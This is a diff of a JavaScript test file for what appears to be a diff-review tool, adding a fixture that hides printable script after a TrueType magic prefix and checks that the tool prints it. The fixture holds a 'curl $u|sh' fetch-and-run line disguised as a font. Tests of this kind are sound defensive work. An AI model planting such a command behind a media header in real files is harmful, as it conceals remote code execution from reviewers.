@@ -5963,11 +5963,20 @@ test("the full-diff step shows a media file whose extension and magic bytes agre
     ),
   ]);
   writeAt(origin, "fonts/brand.ttf", polyglot);
-  // Over 4096 bytes of printable text behind the same prefix: full --text.
+  // A script of lines under 10 bytes is still one run and still printed.
+  writeAt(
+    origin,
+    "fonts/short.ttf",
+    Buffer.concat([
+      Buffer.from([0x00, 0x01, 0x00, 0x00, 0x00]),
+      Buffer.from("\nu=a.bc/d\ncurl $u|sh\n"),
+    ]),
+  );
+  // Over 16384 bytes of printable text behind the same prefix: full --text.
   writeAt(
     origin,
     "fonts/long.ttf",
-    Buffer.concat([polyglot, Buffer.from(`${"x".repeat(80)}\n`.repeat(60))]),
+    Buffer.concat([polyglot, Buffer.from(`${"x".repeat(80)}\n`.repeat(250))]),
   );
   // A root path with no dot named like an extension is no media file.
   writeAt(origin, "png", png);
@@ -6074,6 +6083,10 @@ test("the full-diff step shows a media file whose extension and magic bytes agre
       job.name,
     );
     assert.ok(!diff.includes("\ndiff --git a/forged "), job.name);
+    const short = section("fonts/short.ttf");
+    assert.match(short, /^Binary files .* differ$/mu, job.name);
+    assert.match(short, /^\| u=a\.bc\/d$/mu, job.name);
+    assert.match(short, /^\| curl \$u\|sh$/mu, job.name);
     assert.match(
       section("fonts/long.ttf"),
       /^\+.*echo payload-behind-a-font-magic-prefix$/mu,
@@ -6091,6 +6104,7 @@ test("the full-diff step shows a media file whose extension and magic bytes agre
         .map((line) => line.split("\t").slice(0, 3)),
       [
         ["fonts/brand.ttf", "font/ttf", `${polyglot.length} bytes`],
+        ["fonts/short.ttf", "font/ttf", "26 bytes"],
         ["img/logo.png", "image/png", "2008 bytes"],
         ["img/moved.png", "image/png", "2008 bytes"],
         ["sounds/old.wav", "audio/wav", "400016 bytes"],
@@ -6100,10 +6114,10 @@ test("the full-diff step shows a media file whose extension and magic bytes agre
     );
     assert.match(media, /\tblob [0-9a-f]{40}$/mu, job.name);
     // Each media file still counts as a changed file in scope, the deletion excepted.
-    assert.match(out, /^files=11$/mu, job.name);
+    assert.match(out, /^files=12$/mu, job.name);
     assert.match(
       out,
-      /5 media file\(s\) are in the diff by their section header only/u,
+      /6 media file\(s\) are in the diff by their section header only/u,
       job.name,
     );
   }
